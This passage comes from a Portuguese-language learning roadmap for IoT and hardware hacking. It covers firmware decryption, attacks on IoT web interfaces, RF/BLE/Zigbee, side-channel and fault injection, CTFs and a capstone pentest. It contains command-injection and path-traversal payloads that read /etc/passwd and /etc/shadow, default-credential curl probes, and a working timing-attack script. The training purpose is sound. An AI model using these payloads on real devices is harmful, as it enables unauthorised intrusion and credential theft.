   openssl enc -aes-256-cbc -in firmware_original.tar.gz \
     -out firmware_encrypted.bin -k "HardcodedKey123!"
   # Insira a chave em um "bootloader" simulado
   echo -n "KEY=HardcodedKey123!" > bootloader_dump.bin
   dd if=/dev/urandom bs=1K count=64 >> bootloader_dump.bin
   ```
2. Agora, como atacante, analise o firmware criptografado:
   ```bash
   binwalk -E firmware_encrypted.bin  # entropia alta e uniforme
   strings firmware_encrypted.bin      # nada legível
   file firmware_encrypted.bin         # "data"
   ```
3. "Extraia" a chave do bootloader dump:
   ```bash
   strings bootloader_dump.bin | grep -i "key\|pass\|secret"
   ```
4. Decripte e analise:
   ```bash
   openssl enc -aes-256-cbc -d -in firmware_encrypted.bin \
     -out decrypted.tar.gz -k "HardcodedKey123!"
   tar xzf decrypted.tar.gz
   ```
5. **Entregável**: Relatório documentando todo o processo de análise e decriptação

---


### Módulo 5.6: Hacking de Interfaces Web e APIs de IoT
**Tempo: 2h**

#### O que memorizar
- **Interfaces web em IoT**: a maioria dos dispositivos IoT tem um painel web para configuração (lighttpd, uhttpd, GoAhead, mini_httpd)
- **Vulnerabilidades web clássicas em IoT**:
  - **Command injection**: campos de configuração (ping, traceroute, DNS) que passam input para `system()` ou `popen()`
  - **Credenciais hardcoded**: admin/admin, admin/password, e variações salvas no firmware
  - **Directory traversal**: `../../etc/passwd` em parâmetros de arquivo
  - **Buffer overflow via HTTP**: headers ou parâmetros muito longos crasham o web server
  - **CSRF sem proteção**: mudar senha, configuração via request forjada
  - **APIs REST sem autenticação**: endpoints que retornam/alteram configurações sem checar sessão
- **Ferramentas**: Burp Suite, curl, `wget`, scripts Python com `requests`
- **Dica rápida**: muitas interfaces web de IoT NÃO usam HTTPS — tráfego em plaintext

#### �� Intuição
Se UART é a "porta dos fundos físico", a interface web é a "porta da frente digital". Quase todo dispositivo IoT expõe uma interface web para configuração, e essa interface frequentemente é a coisa mais mal feita do dispositivo inteiro. Desenvolvedores de firmware são especialistas em C/embedded, não em segurança web — então os bugs clássicos de web (SQL injection, command injection, XSS) aparecem em abundância. O melhor: você pode atacar essas interfaces remotamente, sem acesso físico ao dispositivo.

**O workflow é poderoso**: com o firmware emulado no QEMU, você pode testar vulnerabilidades web do painel de configuração sem precisar comprar o dispositivo!

#### Projeto: "IoT Web Exploitation"
1. **Emule um firmware vulnerável com interface web**:
   ```bash
   # Use o DVRF ou um firmware real emulado com FAT/Firmadyne
   # O objetivo é ter a interface web acessível no browser
   ```
2. **Alternativamente, use um lab propositalmente vulnerável**:
   ```bash
   # OWASP IoT Goat
   docker pull owasp/iotgoat
   docker run -p 8080:80 owasp/iotgoat
   ```
3. **Execute recon na interface web**:
   ```bash
   # Descubra todos os endpoints
   curl -s http://TARGET/ | grep -oP 'href="[^"]*"'
   curl -s http://TARGET/ | grep -oP 'action="[^"]*"'
   # Teste credenciais padrão
   curl -v -u admin:admin http://TARGET/
   curl -v -u admin:password http://TARGET/
   ```
4. **Identifique e explore vulnerabilidades**:
   - **Command injection**: em campos de diagnóstico, tente: `; cat /etc/passwd` ou `| id`
   - **Directory traversal**: nos parâmetros de URL, tente: `?file=../../../etc/shadow`
   - **Credenciais no firmware**: use `grep -r` no filesystem extraído para encontrar passwords dos endpoints
5. **Analise o binário do web server no Ghidra**:
   - Importe o httpd/lighttpd/goahead do firmware
   - Busque chamadas a `system()`, `popen()`, `exec()`
   - Trace o input do HTTP request até a chamada de sistema — é assim que você confirma command injection
6. **Prompt IA**: *"Encontrei estas chamadas a system() no web server deste firmware IoT: [cole o pseudocódigo]. Alguma delas é vulnerável a command injection? Como posso confirmar?"*
7. **Entregável**: Relatório de pentest web do dispositivo IoT + provas de conceito

#### Erros Comuns
- Assumir que só porque a interface web exige login, os APIs também exigem (teste endpoints diretos!)
- Esquecer que IoT web servers frequentemente rodam como root — command injection = root shell
- Não testar com e sem cookie de autenticação (muitos endpoints são "protegidos" apenas pelo redirect do JavaScript)
- Ignorar scripts CGI — em IoT, `*.cgi` é frequentemente o ponto mais vulnerável

#### Checkpoint — Fim da Fase 5
Neste ponto, você já tem um arsenal completo. Valide:
- [ ] Consegue extrair, analisar e emular firmware end-to-end
- [ ] Sabe usar Ghidra para encontrar vulnerabilidades em binários ARM/MIPS
- [ ] Pode modificar firmware e reempacotar
- [ ] Entende como atacar interfaces web de dispositivos IoT
- [ ] Sabe lidar com firmware criptografado (pelo menos em teoria)

---

## Fase 6 — Wireless Hacking para IoT

### Módulo 6.1: Fundamentos de RF e SDR
**Tempo: 2h**

#### O que memorizar
- **Conceitos RF**: frequência (Hz), comprimento de onda, modulação (AM, FM, ASK, FSK, OOK)
- **Bandas ISM comuns para IoT**: 433MHz (controles remotos), 868/915MHz (LoRa/Zigbee), 2.4GHz (Wi-Fi/BLE/Zigbee)
- **SDR (Software Defined Radio)**: rádio onde a demodulação é feita em software — muito mais flexível
- **Hardware SDR acessível**: RTL-SDR (~R$60), HackRF One (~R$250), YARD Stick One (sub-GHz)
- **Software**: GNURadio, Universal Radio Hacker (URH), GQRX, SDR#

#### Intuição
Cada dispositivo IoT que se comunica sem fio está literalmente gritando seus dados no ar. Com um SDR, você pode "ouvir" essas transmissões, gravá-las, e muitas vezes reproduzi-las (replay attack). Controles remotos de garagem, sensores de alarme, e keyfobs de carro frequentemente usam RF sem criptografia — um simples replay attack engana o receptor. Pense no SDR como um scanner universal que entende todos os idiomas wireless.

#### Projeto: "Análise RF com Software"
1. Instale o **Universal Radio Hacker (URH)**:
   ```bash
   pip3 install urh
   urh  # abrir GUI
   ```
2. Sem hardware SDR, pratique com captures de exemplo:
   - Baixe samples de RF do [URH Wiki](https://github.com/jopohl/urh/wiki) ou de CTFs
   - Importe no URH e analise: identifique modulação, bit rate, padrões
3. Use o **GNURadio** com fontes simuladas:
   ```bash
   sudo apt install gnuradio
   gnuradio-companion  # GUI flow-graph editor
   ```
   - Crie um flow graph: Signal Source → Frequency Modulator → Oscilloscope Sink
   - Observe como diferentes modulações se comportam visualmente
4. Analise um protocolo simples (ex: controle remoto 433MHz OOK):
   - Identifique o preâmbulo, sync word, payload, e estrutura do pacote
5. **Prompt IA**: *"Tenho um sinal capturado em 433MHz com modulação OOK. A sequência de bits decodificada é: 101010110011... Ajude a identificar o protocolo e a estrutura do pacote."*
6. **Entregável**: Análise de pelo menos 2 sinais RF com decodificação + screenshots

---

### Módulo 6.2: Bluetooth Low Energy (BLE) Hacking
**Tempo: 2h**

#### O que memorizar
- **BLE stack**: Physical → Link Layer → L2CAP → ATT/GATT → Profiles
- **GATT (Generic Attribute Profile)**: Services → Characteristics → Descriptors. Cada characteristic tem um UUID
- **Advertising**: dispositivos BLE broadcasting presença e capabilities — visível para qualquer scanner
- **Ferramentas**: `bluetoothctl`, `hcitool`, `gatttool`, `bettercap`, Wireshark com perfil BLE
- **Ataques comuns**: sniffing (tráfego não criptografado), MITM, replay, brute-force pairing PIN

#### Intuição
BLE é ubíquo em IoT: smartwatches, fechaduras inteligentes, rastreadores fitness, lâmpadas smart. O protocolo foi projetado para ser simples e eficiente em energia — segurança foi uma preocupação secundária nas primeiras versões. Advertising packets revelam informações sobre o dispositivo antes mesmo de conectar. Muitos devices BLE transmitem dados sensíveis (GPS, saúde, senhas) sem criptografia adequada. Uma fechadura smart que usa BLE pode ser vulnerável a replay attack se o desafio-resposta for fraco.

#### Projeto: "BLE Recon e Análise"
1. Se tiver adaptador Bluetooth no Linux:
   ```bash
   sudo hcitool lescan          # escanear dispositivos BLE
   sudo bettercap -eval "ble.recon on"  # scan avançado
   ```
2. Sem hardware BLE, use captures de Wireshark:
   - Baixe BLE pcap samples: busque `bluetooth low energy pcap sample`
   - Abra no Wireshark com filtro `bluetooth` ou `btatt`
   - Identifique: advertising data, GATT reads/writes, dados transmitidos
3. Analise a segurança de um dispositivo BLE popular:
   - Pesquise: `[nome do dispositivo] BLE security vulnerability`
   - Documente o protocolo GATT e as characteristics expostas
4. Escreva um script Python com `bleak` (BLE library — funciona sem hardware em modo simulado para estudo):
   ```python
   # Estudo da API - em hardware real faria scan e connect
   # Documentar os UUIDs comuns e o que significam
   STANDARD_SERVICES = {
       "0x1800": "Generic Access",
       "0x1801": "Generic Attribute",
       "0x180A": "Device Information",
       "0x180F": "Battery Service",
       "0x1812": "Human Interface Device",
   }
   ```
5. **Entregável**: Relatório de análise BLE + capture analysis + script de recon

---

### Módulo 6.3: Wi-Fi e Zigbee para IoT
**Tempo: 2h**

#### O que memorizar
- **Wi-Fi IoT attacks**: WPS bruteforce, deauth → Evil Twin → credential capture, firmware OTA interception
- **Zigbee**: IEEE 802.15.4, mesh networking, 2.4GHz, usado em home automation (Philips Hue, SmartThings)
- **Zigbee attacks**: KillerBee framework, sniffing com ApiMote/RZUSBstick, key extraction
- **Ferramentas Wi-Fi**: aircrack-ng suite, bettercap, wifite, hostapd
- **Ferramentas Zigbee**: KillerBee, ZBOSS, TI SmartRF Packet Sniffer

#### Intuição
A maioria dos dispositivos IoT se conecta à rede doméstica via Wi-Fi ou Zigbee. Wi-Fi é bem conhecido e estudado, mas em IoT os problemas são específicos: firmware updates via HTTP (sem TLS), APIs REST sem autenticação, credenciais de Wi-Fi armazenadas em plaintext na flash. Zigbee é menos conhecido mas igualmente vulnerável — a chave de rede ("network key") frequentemente é transmitida em plaintext durante o join de novos dispositivos.

#### Projeto: "IoT Network Security Audit (Simulado)"
1. Crie uma rede IoT simulada com **Docker** ou VMs:
   ```bash
   # Simule um dispositivo IoT com interface web vulnerável
   docker run -d -p 8080:80 --name iot_device vulnerables/web-dvwa
   docker run -d -p 8081:80 --name iot_cam httpd:latest
   ```
2. Faça reconhecimento de rede:
   ```bash
   nmap -sV -sC 172.17.0.0/16  # scan da rede Docker
   ```
3. Identifique serviços e vulnerabilidades
4. Pesquise e documente ataques Zigbee teóricos:
   - Como funciona o key sniffing durante device pairing
   - Como funciona o replay attack em Zigbee
5. **Entregável**: Relatório de auditoria de rede IoT simulada

---

## Fase 7 — Ataques Avançados de Hardware

### Módulo 7.1: Side-Channel Attacks — Teoria
**Tempo: 2h**

#### O que memorizar
- **Tipos de side-channel**: timing, power analysis (SPA/DPA), electromagnetic emanation, acoustic, cache
- **Simple Power Analysis (SPA)**: observar o consumo de energia revela operações (multiplicação vs adição em RSA)
- **Differential Power Analysis (DPA)**: análise estatística de milhares de traces de consumo para extrair chaves
- **Timing attacks**: tempo de execução varia dependendo dos dados processados (ex: comparação de senha byte-a-byte)
- **Contramedidas**: constant-time algorithms, power noise injection, masking

#### Intuição
Side-channel attacks exploram informação "vazada" involuntariamente pelo hardware. É como adivinhar o que alguém digita ouvindo o som do teclado — cada tecla tem um som ligeiramente diferente. Da mesma forma, cada operação em um processador consome uma quantidade ligeiramente diferente de energia. Com equipamento preciso e análise estatística, você pode literalmente "ouvir" a chave de criptografia sendo processada.

#### Projeto: "Timing Attack em Python"
1. Implemente uma comparação de senha vulnerável a timing attack:
   ```python
   import time
   
   SECRET = "hardware_hack"
   
   def vulnerable_compare(input_str):
       """Comparação byte-a-byte VULNERÁVEL a timing attack"""
       if len(input_str) != len(SECRET):
           return False
       for i in range(len(SECRET)):
           if input_str[i] != SECRET[i]:
               return False
           time.sleep(0.001)  # simular processamento amplificado
       return True
   
   def timing_attack():
       """Explora timing para descobrir a senha caractere por caractere"""
       known = ""
       charset = "abcdefghijklmnopqrstuvwxyz_"
       
       for pos in range(len(SECRET)):
           best_time = 0
           best_char = ""
           for c in charset:
               guess = known + c + "a" * (len(SECRET) - len(known) - 1)
               start = time.perf_counter_ns()
               vulnerable_compare(guess)
               elapsed = time.perf_counter_ns() - start
               if elapsed > best_time:
                   best_time = elapsed
                   best_char = c
           known += best_char
           print(f"Posição {pos}: '{best_char}' (tempo: {best_time}ns) → \"{known}\"")
       
       return known
   ```
2. Execute e observe a senha sendo descoberta caractere por caractere
3. Implemente a versão **segura** (constant-time comparison):
   ```python
   import hmac
   def safe_compare(a, b):
       return hmac.compare_digest(a.encode(), b.encode())
   ```
4. Teste que o timing attack **não funciona** na versão segura
5. **Entregável**: Código + output mostrando ataque + versão segura + explicação

---

### Módulo 7.2: Fault Injection — Teoria e Simulação
**Tempo: 2h**

#### O que memorizar
- **Tipos de fault injection**: voltage glitching, clock glitching, electromagnetic (EMFI), laser, temperature
- **Alvos comuns**: bypass de secure boot, bypass de readout protection, corromper verificação de assinatura
- **Voltage glitching**: abaixar VCC por nanossegundos causa instrução corrompida → skip de branch
- **Ferramentas**: ChipWhisperer (open-source!), custom glitcher com FPGA, PicoEMP (EMFI barato)
- **ChipWhisperer**: kit educacional completo com target board, capture board, e Jupyter notebooks

#### Intuição
Fault injection é como fazer um processador "tropeçar" no momento exato em que ele decide algo importante — como verificar uma senha ou uma assinatura digital. Imagine que o processador está prestes a executar `if (password_correct == false) { deny_access(); }`. Se você causar um glitch elétrico precisamente nessa instrução, o processador pode "pular" o check e executar o código de acesso permitido. É extremamente preciso (nanossegundos) mas devastador quando funciona.

#### Projeto: "Simulação de Glitch Attack"
1. Instale o **ChipWhisperer** em modo software-only:
   ```bash
   pip3 install chipwhisperer
   jupyter notebook  # ChipWhisperer usa Jupyter notebooks
   ```
2. Execute os notebooks tutoriais do ChipWhisperer (não precisa do hardware!):
   - `Fault_1-Introduction_to_Clock_Glitching.ipynb`
   - `Fault_2-Introduction_to_Voltage_Glitching.ipynb`
   - Estes notebooks incluem simulação de como glitches afetam a execução
3. Simule um glitch attack em Python puro:
   ```python
   import random
   
   def secure_boot_check(firmware_hash, expected_hash):
       """Simula verificação de secure boot"""
       return firmware_hash == expected_hash
   
   def glitched_secure_boot_check(firmware_hash, expected_hash, glitch_prob=0.01):
       """Simula o mesmo check mas com possibilidade de glitch"""
       result = firmware_hash == expected_hash
       # Glitch: com pequena probabilidade, o resultado é invertido
       if random.random() < glitch_prob:
           print("[!] GLITCH! Resultado invertido!")
           return not result
       return result
   
   # Testar: firmware malicioso deveria falhar, mas glitch pode permitir
   malicious_hash = "deadbeef"
   expected = "cafebabe"
   
   successes = 0
   for attempt in range(10000):
       if glitched_secure_boot_check(malicious_hash, expected, glitch_prob=0.001):
           successes += 1
   print(f"Bypass de secure boot: {successes}/10000 tentativas com sucesso")
   ```
4. **Entregável**: Notebooks completados + simulação Python + relatório de conceitos

---

### Módulo 7.3: Power Analysis com ChipWhisperer
**Tempo: 2.5h**

#### O que memorizar
- **Power trace**: gráfico de consumo de energia ao longo do tempo durante operação criptográfica
- **Hamming Weight model**: o consumo é proporcional ao número de bits "1" sendo processados
- **CPA (Correlation Power Analysis)**: correlacionar modelo de consumo com traces reais para descobrir a chave
- **Leakage model**: hipótese sobre relação entre dados processados e consumo observado
- **SubBytes em AES**: a S-Box é o ponto de ataque ideal — saída depende da chave e do plaintext

#### Intuição
Imagine que você está adivinhando a senha de um cofre observando o esforço físico de quem gira o dial. Se a pessoa empurra mais forte num certo número, você sabe que é parte da combinação. Power analysis faz o mesmo com um processador: observa quanto energia ele consome ao processar cada byte da chave. A beleza é que isso é **matemático** — com traces suficientes, a análise estatística garante que você encontra a chave correta.

#### Projeto: "CPA Attack Simulado"
1. Use os Jupyter notebooks do ChipWhisperer para CPA:
   - `PA_CPA_1-Using_CW-Analyzer_for_CPA_Attack.ipynb`
   - Estes notebooks incluem traces pr é-capturados — não precisa de hardware
2. Execute o ataque CPA passo a passo:
   - Carregue traces de power consumption
   - Aplique o modelo de Hamming Weight
   - Calcule correlação para cada hipótese de chave
   - Observe a chave correta emergindo com mais traces
3. Visualize os resultados: gráficos de correlação para cada byte da chave
4. **Entregável**: Notebooks completados + chave extraída + gráficos de correlação

---

### Módulo 7.4: Ataques Físicos e Chip-Off
**Tempo: 1.5h**

#### O que memorizar
- **Chip-off**: dessoldar fisicamente o chip de flash e ler com programador externo
- **Hot air rework station**: estação de retrabalho com ar quente para dessoldar SMD/BGA
- **Cold boot attack**: congelar RAM para preservar dados voláteis (chaves de criptografia em memória)
- **Microscopia**: inspecionar die do chip após decapping (remoção do encapsulamento) com ácido nítrico
- **Probing**: usar probes de precisão para tocar diretamente nas trilhas internas do chip

#### Intuição
Estes são os ataques "nucleares" — destrutivos, caros, e extremamente eficazes. Chip-off garante leitura da flash mesmo quando todas as interfaces estão desabilitadas. Decapping e microscopia permitem engenharia reversa do próprio silício. Na prática, esses ataquesaram usados por agências de inteligência e agora estão ao alcance de pesquisadores com equipamento relativamente acessível (~R$2000-5000 para a bancada).

#### Projeto: "Pesquisa de Ataques Físicos"
1. Pesquise e documente **3 casos reais** de ataques físicos a hardware:
   - Ex: Xbox 360 Reset Glitch Hack, Nintendo Switch Fusée Gelée, Ledger wallet attack
2. Para cada caso, documente:
   - Alvo e motivação
   - Técnica utilizada (tipo de fault injection, chip-off, etc.)
   - Equipamento necessário e custo estimado
   - Impacto e resposta do fabricante
3. **Prompt IA**: *"Descreva em detalhes técnicos como o Reset Glitch Hack do Xbox 360 funcionava, incluindo o timing exato e o hardware necessário"*
4. Crie um **decision tree** para escolher o tipo de ataque físico baseado no alvo
5. **Entregável**: Relatório de 3 case studies + decision tree de ataques físicos

---

## Fase 8 — Integração, Projetos Capstone e Portfólio

### Módulo 8.1: CTF de Hardware
**Tempo: 3h**

#### O que memorizar
- **Plataformas de CTF com hardware**: Microcorruption (MSP430 RE), exploit.education (embedded), RHme challenges
- **Categorias comuns**: firmware RE, crypto (side-channel), binary exploitation (ARM/MIPS), protocol analysis
- **Metodologia de CTF**: ler o desafio → reconhecer a categoria → aplicar técnica correta → extrair flag
- **Ferramentas rápidas para CTF**: CyberChef (conversões online), pwntools (exploit dev), ROPgadget

#### Intuição
CTFs consolidam conhecimento sob pressão. Cada challenge testa uma habilidade específica aprendida nos módulos anteriores, mas de forma compacta e com objetivo claro (encontrar a flag). É treino funcional — como sparring para um lutador. Comece por challenges fáceis para construir confiança e aumente gradualmente.

#### Projeto: "Hardware CTF Challenge Sprint"
1. Complete **5 challenges** no [Microcorruption](https://microcorruption.com/):
   - New Orleans (básico), Sydney, Hanoi (intermediário)
   - Foco em: leitura de assembly MSP430, manipulação de memória, bypass de autenticação
2. Complete **3 challenges** de firmware/RE em qualquer plataforma (PicoCTF, CTFlearn, etc.)
3. Tente **1 challenge** do [Exploit Education - Phoenix](https://exploit.education/phoenix/):
   - Stack overflow em ARM — aplica conceitos de debug e exploitation
4. Para cada challenge resolvido, documente:
   - Abordagem utilizada
   - Ferramentas empregadas
   - Onde a IA ajudou (e onde atrapalhou)
5. **Entregável**: Writeups de todos os challenges resolvidos

---

### Módulo 8.2: Projeto Capstone — Full IoT Pentest
**Tempo: 3h (pode estender)

#### O que memorizar
- **Metodologia OWASP IoT Top 10**: guia padrão para teste de segurança de IoT
- **PTES (Penetration Testing Execution Standard)**: adaptado para hardware
- **Documentação profissional**: Executive Summary, Technical Findings, Risk Rating (CVSS), Remediation
- **Responsible disclosure**: como reportar vulnerabilidades de forma ética

#### Intuição
Este é o módulo que junta TUDO. Você vai executar um pentest completo de um dispositivo IoT (real ou emulado), do início ao fim, documentando como um profissional. Este relatório pode servir como portfólio para demonstrar suas habilidades. Trate como se fosse um engajamento pago — profissionalismo, metodologia, e documentação impecável.

#### Projeto: "IoT Security Assessment Completo"
1. **Escolha o alvo**: firmware emulado via QEMU/Firmadyne, ou dispositivo IoT real (se disponível)
2. **Execute cada fase**:
   - **Reconhecimento**: OSINT, FCC ID, datasheets, CVE research
   - **Análise de PCB**: identificação de componentes e interfaces (com fotos FCC)
   - **Firmware**: extração (download ou dump), Binwalk, análise de filesystem
   - **Análise estática**: Ghidra para binários interessantes, busca de vulnerabilidades
   - **Emulação**: QEMU/FAT para rodar o firmware e testar dinamicamente
   - **Exploração**: ativar qualquer vulnerabilidade encontrada
   - **Pós-exploração**: demonstrar impacto (extração de dados, persistência)
3. **Produza um relatório profissional** com:
   - Sumário executivo (1 página, não-técnico)
   - Metodologia utilizada
   - Achados técnicos (com screenshots, PoC code, CVSS score)
   - Recomendações de mitigação
4. Use IA para revisão final: *"Revise este relatório de pentest de IoT. Verifique se a metodologia está completa, se os achados estão bem documentados, e sugira melhorias."*
5. **Entregável**: Relatório profissional completo (mínimo 10 páginas)

---

### Módulo 8.3: Construção de Portfólio e Próximos Passos
**Tempo: 2h**

#### O que memorizar
- **Plataformas de portfólio**: GitHub (code + writeups), blog pessoal (Hugo/Jekyll), YouTube (demonstrações)
- **Certificações relevantes**: TCM PNPT, OSCP (futuro), CEH (básico), Hardware Hacking Expert (TrainSec)
- **Comunidades**: /r/hardwarehacking, Hack The Planet Discord, local hackerspace/makerspace
- **Conferências**: DEF CON (Hardware Hacking Village), BSides, Roadsec (Brasil), H2HC (Brasil)
- **Bug bounty**: HackerOne e Bugcrowd têm programas de IoT

#### Intuição
O conhecimento só tem valor quando aplicado e demonstrado. Um portfólio forte com writeups detalhados, projetos open-source, e relatórios de pentest é mais valioso que qualquer certificação sozinha. Participe de comunidades, contribua com writeups de CTF, publique ferramentas, e apresente em conferências. Hardware hacking é uma das áreas com mais demanda e menos profissionais capacitados.

#### Projeto: "Launch Pad Profissional"
1. Organize todo o material produzido durante o roadmap num **repositório GitHub**:
   - `/writeups` — CTF writeups
   - `/tools` — scripts Python criados
   - `/reports` — relatórios de pentest
   - `/notes` — anotações de estudo
   - `README.md` — overview do seu percurso de aprendizado
2. Escreva **3 blog posts** sobre tópicos que dominou (pode ser em seu blog ou Medium):
   - Ex: "Como identifiquei UART em uma PCB", "Análise de firmware com Binwalk e Ghidra", "Timing attack em Python"
3. Crie um **plano de 6 meses** para próximos passos:
   - Hardware real para adquirir (priorizado por custo-benefício)
   - Certificações a buscar
   - Conferências para participar
   - Áreas para aprofundar (automotive, medical devices, industrial, mobile)
4. **Entregável**: Repositório GitHub organizado + 3 blog posts draft + plano de 6 meses

---


---

## 🆘 Se Você Travar...

É normal travar em alguns módulos. Aqui está como desbloquear:

| Problema | Solução |
|----------|---------|
| "Não entendo nada de eletrônica" | Volte ao módulo 1.1, assista vídeos no YouTube sobre eletrônica básica. Canal recomendado: Ben Eater, The Engineering Mindset |
| "Binwalk/QEMU não funciona" | Verifique dependências e versões. Use IA: *"Estou recebendo este erro ao rodar [comando]: [erro]. Como resolver?"* |
| "Não consigo ler datasheets" | Normal no início! Use IA para traduzir e explicar. Com 5-10 datasheets lidos, fica natural |
| "Ghidra é muito complexo" | Comece só com a busca de strings + cross references. Ignore 80% da interface por enquanto |
| "Não tenho hardware físico" | Você pode fazer 80% deste roadmap com software. Os módulos de simulação existem por isso |
| "O firmware não emula" | Nem todo firmware emula perfeitamente. Tente outro firmware, ou foque na análise estática |
| "Não sei por onde começar um pentest" | Siga o checklist do Módulo 2.4. Sempre comece por OSINT → firmware → interfaces |

> [!TIP]
> **Regra dos 30 minutos**: se você está travado em algo por mais de 30 minutos, mude de abordagem. Pergunte a uma IA, busque no Google, ou pule para outro módulo e volte depois. Não gaste energia lutando contra uma ferramenta quando deveria estar aprendendo conceitos.

## 📚 Recursos Complementares

### Livros Recomendados
| Livro | Foco | Nível |
|-------|------|-------|
| *The Hardware Hacking Handbook* (Jasper van Woudenberg) | Ataques a sistemas embarcados | Intermediário |
| *Practical IoT Hacking* (Fotios Chantzis et al.) | IoT pentest completo | Iniciante-Intermediário |
| *Hardware Security: A Hands-On Approach* (Swarup Bhunia) | Segurança de hardware acadêmico | Avançado |
| *The Car Hacker's Handbook* (Craig Smith) | Hacking automotivo (CAN bus) | Intermediário |
| *Hacking the Xbox* (Andrew Huang) | Case study clássico | Iniciante |

### Plataformas e Cursos Online
- **TCM Security** — Beginner's Guide to IoT and Hardware Hacking
- **TrainSec** — Hardware Hacking Expert Level 1 & 2
- **VoidStar Security** — Hardware Hacking Bootcamp
- **ChipWhisperer** — Tutorials e notebooks Jupyter
- **Microcorruption** — CTF de embedded RE
- **Exploit Education** — Phoenix (ARM exploitation)

### Ferramentas Essenciais (Software Gratuito)
| Ferramenta | Função |
|-----------|--------|
| Binwalk | Análise e extração de firmware |
| Ghidra | Engenharia reversa / decompilação |
| QEMU | Emulação multi-arquitetura |
| OpenOCD | Interface JTAG/SWD |
| Firmadyne/FAT | Emulação automatizada de firmware |
| PulseView/Sigrok | Analisador lógico (software) |
| GNURadio | Processamento de sinais RF |
| URH | Análise de protocolos wireless |
| ChipWhisperer (software) | Side-channel / fault injection |
| Wireshark | Análise de protocolos de rede |

### Hardware Recomendado (Quando Estiver Pronto)
| Equipamento | Preço Estimado (BR) | Prioridade |
|------------|---------------------|-----------|
| USB-UART Adapter (CP2102/CH340) | R$15 | ⭐⭐⭐⭐⭐ |
| Logic Analyzer 8ch (Saleae clone) | R$30 | ⭐⭐⭐⭐⭐ |
| Multímetro digital | R$40 | ⭐⭐⭐⭐⭐ |
| CH341A Flash Programmer + SOP8 Clip | R$35 | ⭐⭐⭐⭐ |
| Bus Pirate v3.6 | R$80 | ⭐⭐⭐⭐ |
| Ferro de Solda (Pinecil/TS100) | R$150 | ⭐⭐⭐⭐ |
| Raspberry Pi 4 | R$350 | ⭐⭐⭐ |
| RTL-SDR v3 | R$60 | ⭐⭐⭐ |
| HackRF One | R$250 | ⭐⭐ |
| ChipWhisperer-Lite | R$1500 | ⭐⭐ |
| Flipper Zero | R$1200 | ⭐⭐ |
| Oscilloscope (Rigol DS1054Z) | R$2000 | ⭐ |

---

> **Nota Final**: Este roadmap foi desenhado para ser completado em **2-4 meses** com dedicação de 1-3h por dia. Não pule módulos — cada um constrói sobre o anterior. Use IA como acelerador, mas sempre valide e entenda o output. Hardware hacking é uma jornada, não um destino. Boa sorte e hack responsavelmente! 🔓
